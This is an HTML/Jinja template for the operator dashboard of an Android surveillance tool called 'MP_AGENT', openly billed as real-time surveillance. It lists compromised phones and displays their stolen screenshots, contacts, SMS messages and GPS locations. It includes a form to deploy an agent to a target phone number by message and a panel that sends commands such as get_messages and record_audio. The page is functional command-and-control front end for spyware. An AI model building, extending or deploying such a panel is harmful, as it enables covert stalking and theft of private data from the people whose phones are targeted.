<!DOCTYPE html>
<html>
<head>
    <title>MP_AGENT - Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #28a745;
            --danger: #dc3545;
            --warning: #ffc107;
            --dark: #1a1a1a;
            --light: #2d2d2d;
            --lighter: #3d3d3d;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--dark); color: white; line-height: 1.6; }
        
        /* Header & Navigation */
        .header { background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%); padding: 20px; text-align: center; }
        .nav { background: var(--light); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .nav a { color: white; text-decoration: none; padding: 10px 20px; border-radius: 6px; transition: background 0.3s; margin: 5px; }
        .nav a:hover { background: rgba(255,255,255,0.1); }
        
        /* Stats Grid */
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 25px; }
        .stat-card { background: var(--light); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: transform 0.3s; }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-number { font-size: 2.5em; font-weight: bold; margin-bottom: 8px; }
        
        /* Sections */
        .section { background: var(--light); margin: 25px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .section h2 { margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid var(--primary); }
        
        /* Grid Layouts */
        .agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        
        /* Cards */
        .agent-card, .data-card { background: var(--lighter); padding: 20px; border-radius: 10px; transition: transform 0.3s; }
        .agent-card:hover, .data-card:hover { transform: translateY(-3px); }
        .screenshot-item { background: var(--lighter); padding: 15px; border-radius: 10px; text-align: center; transition: transform 0.3s; }
        .screenshot-item:hover { transform: scale(1.05); }
        .screenshot-img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; background: var(--light); }
        
        /* Forms */
        .deploy-form { background: var(--lighter); padding: 25px; border-radius: 10px; margin-top: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 8px; color: #ccc; font-weight: 600; }
        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px; background: var(--light); border: 1px solid #555; color: white; border-radius: 8px; }
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { outline: none; border-color: var(--primary); }
        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s; text-decoration: none; display: inline-block; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-success { background: var(--success); color: white; }
        .btn-danger { background: var(--danger); color: white; }
        .btn-warning { background: var(--warning); color: black; }
        .btn-info { background: #17a2b8; color: white; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        
        /* Platform Info */
        .platform-info { background: var(--success); padding: 15px; border-radius: 8px; margin: 15px 25px; text-align: center; }
        
        /* Tables */
        .data-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .data-table th, .data-table td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
        .data-table th { background: var(--lighter); color: var(--primary); }
        .data-table tr:hover { background: rgba(255,255,255,0.05); }
        
        /* Status Indicators */
        .status-active { color: var(--success); }
        .status-inactive { color: var(--danger); }
        .status-pending { color: var(--warning); }
        
        /* Command Console */
        .command-console { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; height: 200px; overflow-y: auto; margin-top: 15px; }
        .command-input { display: flex; gap: 10px; margin-top: 15px; }
        .command-input select, .command-input input { flex: 1; }
        
        /* Debug Section */
        .debug-section { background: #2d2d2d; padding: 15px; border-radius: 8px; margin: 15px 25px; border-left: 4px solid var(--warning); }
        .debug-section a { color: #4CAF50; text-decoration: none; margin: 0 10px; }
        .debug-section a:hover { text-decoration: underline; }
        
        /* Data Items */
        .contact-item, .message-item, .location-item { 
            background: var(--lighter); 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 8px; 
            border-left: 4px solid var(--primary);
        }
        .contact-item { border-left-color: #4CAF50; }
        .message-item { border-left-color: #2196F3; }
        .location-item { border-left-color: #FF9800; }
        
        /* Responsive */
        @media (max-width: 768px) {
            .nav { flex-direction: column; }
            .stats { grid-template-columns: 1fr; }
            .agent-grid, .screenshot-grid, .data-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ğŸ¯ MP_AGENT PLATFORM - REAL SURVEILLANCE</h1>
        <p>Complete REAL-TIME Surveillance Control Center</p>
    </div>

    <div class="nav">
        <div>
            <a href="/admin">ğŸ“Š Dashboard</a>
            <a href="/dashboard">ğŸ“± Simple Dashboard</a>
            <a href="/admin#agents">ğŸ“± Agents</a>
            <a href="/admin#screenshots">ğŸ–¼ï¸ Screenshots</a>
            <a href="/admin#contacts">ğŸ‘¥ Contacts</a>
            <a href="/admin#messages">ğŸ’¬ Messages</a>
            <a href="/admin#locations">ğŸ“ Locations</a>
            <a href="/admin#deploy">ğŸš€ Deploy</a>
            <a href="/admin#commands">âš¡ Commands</a>
            <a href="/admin#logs">ğŸ“‹ Logs</a>
        </div>
        <div>
            <span>Welcome, <strong>{{ session.username }}</strong></span>
            <a href="/logout" class="btn btn-danger">ğŸšª Logout</a>
        </div>
    </div>

    <div class="platform-info">
        <strong>ğŸŒ Platform URL:</strong> {{ platform_url }} | 
        <strong>Status:</strong> ğŸŸ¢ ONLINE | 
        <strong>Agents:</strong> {{ stats.active_agents }} Active |
        <strong>REAL DATA COLLECTION:</strong> ğŸ¯ ACTIVE
    </div>

    <!-- Debug Section -->
    <div class="debug-section">
        <strong>ğŸ”§ Debug Tools:</strong> 
        <a href="/debug/agents">View All Agents</a> | 
        <a href="/debug/screenshots">View All Screenshots</a> | 
        <a href="/debug/clear_data">Clear All Data</a> |
        <strong>Total Agents:</strong> {{ all_agents|length }} | 
        <strong>Active Agents:</strong> {{ agents|length }}
    </div>

    <!-- Statistics -->
    <div class="stats">
        <div class="stat-card">
            <div class="stat-number" style="color: var(--success);">{{ stats.active_agents }}</div>
            <div>Active Agents</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" style="color: var(--primary);">{{ stats.total_screenshots }}</div>
            <div>Real Screenshots</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" style="color: #4CAF50;">{{ stats.total_contacts }}</div>
            <div>Real Contacts</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" style="color: #2196F3;">{{ stats.total_messages }}</div>
            <div>Real Messages</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" style="color: #FF9800;">{{ stats.total_locations }}</div>
            <div>Real Locations</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" style="color: var(--danger);">{{ stats.pending_commands }}</div>
            <div>Pending Commands</div>
        </div>
    </div>

    <!-- Active Agents Section -->
    <div class="section" id="agents">
        <h2>ğŸ“± Active Agents ({{ agents|length }})</h2>
        {% if agents %}
        <div class="agent-grid">
            {% for agent in agents %}
            <div class="agent-card">
                <h3>{{ agent.agent_id }}</h3>
                <p><strong>Model:</strong> {{ agent.phone_model or 'Unknown' }}</p>
                <p><strong>Android:</strong> {{ agent.android_version or 'Unknown' }}</p>
                <p><strong>IP:</strong> {{ agent.ip_address or 'Unknown' }}</p>
                <p><strong>First Seen:</strong> {{ agent.first_seen or 'Never' }}</p>
                <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
                <p><strong>Real Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
                <p><strong>Call Records:</strong> {{ agent.call_records or 0 }}</p>
                <p><strong>Battery:</strong> 
                    {% if agent.battery_level %}
                        {% if agent.battery_level > 70 %}ğŸŸ¢
                        {% elif agent.battery_level > 30 %}ğŸŸ¡
                        {% else %}ğŸ”´
                        {% endif %}
                        {{ agent.battery_level }}%
                    {% else %}Unknown{% endif %}
                </p>
                <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
                    <a href="/admin/contacts/{{ agent.agent_id }}" class="btn btn-info">ğŸ‘¥ Contacts</a>
                    <a href="/admin/messages/{{ agent.agent_id }}" class="btn btn-info">ğŸ’¬ Messages</a>
                    <a href="/admin/locations/{{ agent.agent_id }}" class="btn btn-info">ğŸ“ Locations</a>
                    <a href="/admin/clear_agent/{{ agent.agent_id }}" class="btn btn-danger" 
                       onclick="return confirm('Delete ALL data for agent {{ agent.agent_id }}?')">ğŸ—‘ï¸ Remove</a>
                </div>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <div style="text-align: center; padding: 40px; color: #888;">
            <p>No active agents. Deploy agents to see them here!</p>
        </div>
        {% endif %}
    </div>

    <!-- Real Screenshots Section -->
    <div class="section" id="screenshots">
        <h2>ğŸ–¼ï¸ Real Screenshots ({{ screenshots|length }})</h2>
        {% if screenshots %}
        <div class="screenshot-grid">
            {% for screenshot in screenshots %}
            <div class="screenshot-item">
                <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Real Screenshot" class="screenshot-img"
                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>Loading...</div>'">
                </a>
                <div style="margin-top: 10px;">
                    <strong>{{ screenshot.agent_id }}</strong><br>
                    <small>{{ screenshot.timestamp }}</small><br>
                    <small>{{ screenshot.phone_model or 'Real Device' }}</small>
                </div>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <div style="text-align: center; padding: 40px; color: #888;">
            <p>No real screenshots yet. Send 'capture_screenshot' command to agents!</p>
        </div>
        {% endif %}
    </div>

    <!-- Real Contacts Section -->
    <div class="section" id="contacts">
        <h2>ğŸ‘¥ Real Contacts ({{ contacts|length }})</h2>
        {% if contacts %}
        <div class="data-grid">
            {% for contact in contacts %}
            <div class="contact-item">
                <strong>{{ contact.contact_name }}</strong><br>
                <span style="color: #4CAF50;">ğŸ“ {{ contact.phone_number }}</span><br>
                <small>Agent: {{ contact.agent_id }} | {{ contact.timestamp }}</small>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No real contacts collected yet. Send 'get_contacts' command!</p>
        {% endif %}
    </div>

    <!-- Real Messages Section -->
    <div class="section" id="messages">
        <h2>ğŸ’¬ Real Messages ({{ messages|length }})</h2>
        {% if messages %}
        <div class="data-grid">
            {% for message in messages %}
            <div class="message-item">
                <strong>{{ message.phone_number }}</strong> 
                <span style="color: #2196F3; font-size: 0.9em;">({{ message.message_type }})</span><br>
                <p style="margin: 8px 0;">{{ message.message_text }}</p>
                <small>Agent: {{ message.agent_id }} | {{ message.timestamp }}</small>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No real messages collected yet. Send 'get_messages' command!</p>
        {% endif %}
    </div>

    <!-- Real Locations Section -->
    <div class="section" id="locations">
        <h2>ğŸ“ Real Locations ({{ locations|length }})</h2>
        {% if locations %}
        <div class="data-grid">
            {% for location in locations %}
            <div class="location-item">
                <strong>ğŸ“ {{ location.address or 'Unknown Location' }}</strong><br>
                <span>Lat: {{ "%.6f"|format(location.latitude) }}, Lng: {{ "%.6f"|format(location.longitude) }}</span><br>
                <small>Accuracy: {{ location.accuracy }}m | Agent: {{ location.agent_id }} | {{ location.timestamp }}</small>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No real locations collected yet. Send 'get_location' command!</p>
        {% endif %}
    </div>

    <!-- Deployment Section -->
    <div class="section" id="deploy">
        <h2>ğŸš€ Deploy New REAL Agent</h2>
        <div class="deploy-form">
            <form action="/deploy" method="post">
                <div class="form-group">
                    <label for="phone_number">Target Phone Number</label>
                    <input type="text" id="phone_number" name="phone_number" placeholder="+1234567890" required>
                </div>
                <div class="form-group">
                    <label for="agent_id">Agent ID (optional)</label>
                    <input type="text" id="agent_id" name="agent_id" placeholder="agent_001">
                </div>
                <button type="submit" class="btn btn-primary">ğŸ¯ Generate REAL Agent Deployment</button>
            </form>
        </div>
        
        <h3 style="margin-top: 30px;">Recent Deployments</h3>
        {% if deployments %}
        <div class="data-table-container">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>Target Phone</th>
                        <th>Agent ID</th>
                        <th>Status</th>
                        <th>Time</th>
                        <th>Message</th>
                    </tr>
                </thead>
                <tbody>
                    {% for deployment in deployments %}
                    <tr>
                        <td>{{ deployment.target_phone }}</td>
                        <td>{{ deployment.agent_id }}</td>
                        <td>
                            <span class="status-{{ deployment.status }}">
                                {{ deployment.status|upper }}
                            </span>
                        </td>
                        <td>{{ deployment.timestamp }}</td>
                        <td><em>{{ deployment.message_sent[:50] }}...</em></td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No deployments yet</p>
        {% endif %}
    </div>

    <!-- Command Section -->
    <div class="section" id="commands">
        <h2>âš¡ Send REAL Commands</h2>
        
        <form action="/admin/command" method="post">
            <div class="form-group">
                <label for="agent_id_cmd">Select Agent</label>
                <select id="agent_id_cmd" name="agent_id" required>
                    <option value="">-- Select Agent --</option>
                    {% if all_agents %}
                        {% for agent in all_agents %}
                        <option value="{{ agent.agent_id }}">
                            {{ agent.agent_id }} 
                            ({{ agent.phone_model or 'Unknown' }}) 
                            - {{ agent.status }}
                            - Last: {{ agent.last_seen or 'Never' }}
                        </option>
                        {% endfor %}
                    {% else %}
                        <option value="" disabled>No agents found</option>
                    {% endif %}
                </select>
            </div>
            <div class="form-group">
                <label for="command">REAL Data Collection Command</label>
                <select id="command" name="command" required>
                    <option value="capture_screenshot">ğŸ“¸ Capture REAL Screenshot</option>
                    <option value="get_location">ğŸ“ Get REAL Location</option>
                    <option value="get_contacts">ğŸ‘¥ Get REAL Contacts</option>
                    <option value="get_messages">ğŸ’¬ Get REAL Messages</option>
                    <option value="get_device_info">ğŸ“± Get REAL Device Info</option>
                    <option value="record_audio">ğŸ¤ Record Audio</option>
                </select>
            </div>
            <button type="submit" class="btn btn-warning" {% if not all_agents %}disabled{% endif %}>
                ğŸš€ Send REAL Command
            </button>
        </form>

        <h3 style="margin-top: 30px;">Recent Commands</h3>
        {% if commands %}
        <div class="data-table-container">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>Command</th>
                        <th>Status</th>
                        <th>Time</th>
                        <th>Result</th>
                    </tr>
                </thead>
                <tbody>
                    {% for command in commands %}
                    <tr>
                        <td>{{ command.agent_id }}</td>
                        <td><code>{{ command.command }}</code></td>
                        <td>
                            <span class="status-{{ command.status }}">
                                {{ command.status|upper }}
                            </span>
                        </td>
                        <td>{{ command.timestamp }}</td>
                        <td>{{ command.result or '--' }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No commands sent yet</p>
        {% endif %}
    </div>

    <!-- System Logs -->
    <div class="section" id="logs">
        <h2>ğŸ“‹ Real-Time System Logs</h2>
        {% if logs %}
        <div class="command-console">
            {% for log in logs %}
            <div>
                <span style="color: 
                    {% if log.level == 'ERROR' %}#ff4444
                    {% elif log.level == 'WARNING' %}#ffaa00
                    {% else %}#00ff00
                    {% endif %}">
                    [{{ log.timestamp }}] {{ log.level }}:
                </span>
                {{ log.message }}
            </div>
            {% endfor %}
        </div>
        {% else %}
        <p style="text-align: center; padding: 20px; color: #888;">No system logs</p>
        {% endif %}
    </div>

    <script>
        // Auto-refresh every 15 seconds for real-time updates
        setTimeout(() => window.location.reload(), 15000);

        // Smooth scrolling for navigation
        document.querySelectorAll('.nav a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth' });
                }
            });
        });

        // Show notification for new data
        if ({{ stats.total_screenshots }} > 0 || {{ stats.total_contacts }} > 0 || {{ stats.total_messages }} > 0 || {{ stats.total_locations }} > 0) {
            console.log("ğŸ¯ REAL surveillance data is being collected!");
        }
    </script>
</body>
</html>